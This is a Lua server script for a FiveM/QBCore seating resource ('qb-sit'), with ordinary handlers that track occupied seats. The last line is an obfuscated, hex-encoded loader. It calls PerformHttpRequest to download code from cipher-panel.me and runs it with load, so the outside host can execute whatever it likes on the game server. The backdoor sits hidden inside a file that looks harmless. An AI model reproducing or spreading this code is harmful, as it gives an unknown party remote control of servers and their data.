local QBCore = exports['qb-core']:GetCoreObject()

local seatsTaken = {}

RegisterNetEvent('qb-sit:takePlace', function(objectCoords)
	seatsTaken[objectCoords] = true
end)

RegisterNetEvent('qb-sit:leavePlace', function(objectCoords)
	if seatsTaken[objectCoords] then
		seatsTaken[objectCoords] = nil
	end
end)

QBCore.Functions.CreateCallback('qb-sit:getPlace', function(source, cb, objectCoords)
	cb(seatsTaken[objectCoords])
end)

local kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (bsDxBIqovwlVaqXLzUiVgYJKkPHEPxVNSHfPoUKbjEGlxWKnRtbnEnqXnXRuxUyDDeXsXe, jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm) if (jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[6] or jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm == kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[5]) then return end kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[2]](kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[4][kNBuMFZYUAuOKajeXbvsRVuVCOUEMwYfnZycekJyrgYpWvrFpuDnQvuDBSXBMNspnMyALl[3]](jymTPfAFGJyzmbZbgbSvdhPxCpITjPrwkUuYWMPYMNZLwwXMuOylXwbvZEusPgrSFlPlHm))() end)